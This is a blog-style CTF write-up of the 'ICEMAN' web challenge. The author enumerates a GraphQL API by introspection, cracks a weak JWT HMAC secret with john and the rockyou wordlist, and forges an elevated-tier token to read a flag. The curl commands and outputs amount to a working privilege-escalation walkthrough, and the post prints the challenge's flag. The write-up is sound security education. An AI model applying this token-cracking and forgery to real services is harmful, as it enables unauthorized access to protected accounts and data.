---
layout: post
title:  "ICEMAN"
date:   2026-06-08 14:51:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /Dal-CTF-2026-iceman/
---

**Title**: ICEMAN

**Author**: C00kieSn4tcher

**Category**: Web

**Description**: Drake's label OVO is days away from dropping ICEMAN — his most guarded project yet. They run a private API for members on the early-access list. You managed to snag a fan account. The vault is locked down tight... or is it? Instance available at: `https://dalctf-iceman-154-64616c.instancer.dalctf2026.com/`

I go to the site:

![Alt text](/images/dalctfweb13.png)

The source code has this script:
```html
<script>
  async function run() {
    const query = document.getElementById("query").value.trim();
    const token = document.getElementById("token").value.trim();
    const out = document.getElementById("output");
    const status = document.getElementById("status");
    if (!query) {
      out.textContent = "";
      return;
    }
    const headers = {
      "Content-Type": "application/json"
    };
    if (token) headers["Authorization"] = token.startsWith("Bearer ") ? token : "Bearer " + token;
    status.textContent = "sending...";
    out.className = "";
    try {
      const res = await fetch("/graphql", {
        method: "POST",
        headers,
        body: JSON.stringify({
          query
        })
      });
      const data = await res.json();
      out.textContent = JSON.stringify(data, null, 2);
      if (data.errors) out.className = "err";
      status.textContent = res.status + " " + (data.errors ? "error" : "ok");
    } catch (e) {
      out.textContent = e.message;
      out.className = "err";
      status.textContent = "network error";
    }
  }
  document.getElementById("query").addEventListener("keydown", function(e) {
    if ((e.ctrlKey || e.metaKey) && e.key === "Enter") run();
  });
</script>
```

I trying sending a request like this:
```http
POST /graphql HTTP/2
Host: dalctf-iceman-154-64616c.instancer.dalctf2026.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://dalctf-iceman-154-64616c.instancer.dalctf2026.com/graphql
Content-Type: application/json
Content-Length: 43
Origin: https://dalctf-iceman-154-64616c.instancer.dalctf2026.com
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"query":"{ releasedAlbums { id title } }"}
```

The response confirms I need a valid jwt for authentication:
```http
HTTP/2 200 OK
Content-Type: application/json
Date: Sun, 07 Jun 2026 11:50:17 GMT
Server: gunicorn
Content-Length: 126

{"data":null,"errors":[{"locations":[{"column":3,"line":1}],"message":"Authentication required.","path":["releasedAlbums"]}]}
```

I start testing `/graphql` by sending: 
```shell
{"query":"query { __schema { types { name fields { name } } } }"}
```

This will test for introspection:
```shell
curl -X POST https://dalctf-iceman-154-64616c.instancer.dalctf2026.com/graphql \ -H "Content-Type: application/json" \  
-d '{"query":"query { __schema { types { name fields { name } } } }"}'  
{"data":{"__schema":{"types":[{"fields":[{"name":"me"},{"name":"releasedAlbums"},{"name":"album"},{"name":"label"}],"name":"Query"},{"fields":null,"name":"ID"},{"fields":null,"name":"String"},{"fields":[{"name":"register"},{"name":"login"}],"name":"Mutation"},{"fields":[{"name":"token"}],"name":"AuthPayload"},{"fields":[{"name":"username"},{"name":"tier"}],"name":"User"},{"fields":[{"name":"name"},{"name":"artists"}],"name":"Label"},{"fields":[{"name":"name"},{"name":"albums"}],"name":"Artist"},{"fields":[{"name":"id"},  
{"name":"title"},{"name":"status"},{"name":"tracks"},{"name":"vaultManifest"}],"name":"Album"},{"fields":[{"name":"number"},{"name":"title"}],"name":"Track"},{"fields":null,"name":"Int"},{"fields":null,"name":"Boolean"},{"fields":[{"name":"description"},{"name":"types"},{"name":"queryType"},{"name":"mutationType"},{"name":"subscriptionType"},{"name":"directives"}],"name":"__Schema"},{"fields":[{"name":"kind"},{"name":"name"},{"name":"description"},{"name":"specifiedByURL"},{"name":"fields"},{"name":"interfaces"},{"name":"possibleTypes"},{"name":"enumValues"},{"name":"inputFields"},{"name":"ofType"},{"name":"isOneOf"}],"name":"__Type"},{"fields":null,"name":"__TypeKind"},{"fields":[{"name":"name"},{"name":"description"},{"name":"args"},{"name":"type"},{"name":"isDeprecated"},{"name":"deprecationReason"}],"name":"__Field"},{"fields":[{"name":"name"},{"name":"description"},{"name":"type"},{"name":"defaultValue"},{"name":"isDeprecated"},{"name":"deprecationReason"}],"name":"__InputValue"},{"fields":[{"name":"name"},{"name":"description"},  
{"name":"isDeprecated"},{"name":"deprecationReason"}],"name":"__EnumValue"},{"fields":[{"name":"name"},{"name":"description"},{"name":"isRepeatable"},{"name":"locations"},{"name":"args"},{"name":"isDeprecated"},{"name":"deprecationReason"}],"name":"__Directive"},{"fields":null,"name":"__DirectiveLocation"}]}}}
```

There is a lot of output, but I see a `login` and a `register` mutation. I try registering an account:
```shell
curl -X POST https://dalctf-iceman-154-64616c.instancer.dalctf2026.com/graphql \ 
-H "Content-Type: application/json" \  
-d '{"query":"mutation { register(username: \"ctfplayer\", password: \"ctfpass123\") { token } }"}'  
{"data":{"register":{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImN0ZnBsYXllciIsInRpZXIiOiJmYW4ifQ.1JaefmCnFrOkG1gpQ50l0i7GIfDWiLn3vx9TcAGiPu0"}}}
```

I successfully register and get a jwt. Header and claims:
```shell
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "username": "ctfplayer",
  "tier": "fan"
}
```

I try using the jwt:
```shell
curl -X POST https://dalctf-iceman-154-64616c.instancer.dalctf2026.com/graphql \ 
-H "Content-Type: application/json" \  
-H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImN0ZnBsYXllciIsInRpZXIiOiJmYW4ifQ.1JaefmCnFrOkG1gpQ50l0i7GIfDWiLn3vx9TcAGiPu0" \  
-d '{"query":"{ me { username tier } }"}'  
{"data":{"me":null},"errors":[{"locations":[{"column":3,"line":1}],"message":"OVO membership required. Fan accounts do not have vault access.","path":["me"]}]}
```

I still dont have access with a `fan` tier account. It says I need an `OVO membership`. I tried cracking the secret with `john`:
```shell
john --wordlist=/usr/share/wordlists/rockyou.txt jwt  
Using default input encoding: UTF-8  
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])  
Will run 2 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
iceman           (?)  
1g 0:00:00:00 DONE (2026-06-07 08:00) 2.380g/s 9752p/s 9752c/s 9752C/s 123456..bigman  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.
```

I get the secret `iceman`! 

On [https://www.jwt.io/](https://www.jwt.io/) I forge a jwt to look like this:
```shell
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "username": "iceman",
  "tier": "OVO"
}
```

Then I send a query for:
```shell
{ label(name: "OVO") { name artists { name albums { id title status vaultManifest tracks { number title } } } } }
```

```shell
curl -X POST https://dalctf-iceman-154-64616c.instancer.dalctf2026.com/graphql -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImN0ZnBsYXllciIsInRpZXIiOiJPVk8ifQ.jh2k5J3V3-fRWeRZmpyRnVTdPOTzZp-4dhjZrTyeiM0" -d '{"query":"{ label(name: \"OVO\") { name artists { name albums { id title status vaultManifest tracks { number title } } } } }"}'  
{"data":{"label":{"artists":[{"albums":[{"id":"1","status":"RELEASED","title":"For All the Dogs","tracks":[{"number":1,"title":"Virginia Beach"},{"number":2,"title":"Rich Baby Daddy"}],"vaultManifest":null},{"id":"2","status":"RELEASED","title":"Some Sexy Songs 4 U","tracks":[{"number":1,"title":"Desire"},{"number":2,"title":"After Dark"}],"vaultManifest":null},{"id":"9","status":"UNRELEASED","title":"ICEMAN","tracks":[{"number":1,"title":"Make Them Cry"},{"number":2,"title":"National Treasures"},{"number":3,"title":"Plot Twist"}],"vaultManifest":"dalctf2026{open-ticket-send-me-ur-fav-song-in-album6}"}],"name":"Drake"}],"name":"OVO"}}}
```

This returns the `vaultManifest` for the unreleased album!

`dalctf2026{open-ticket-send-me-ur-fav-song-in-album6}`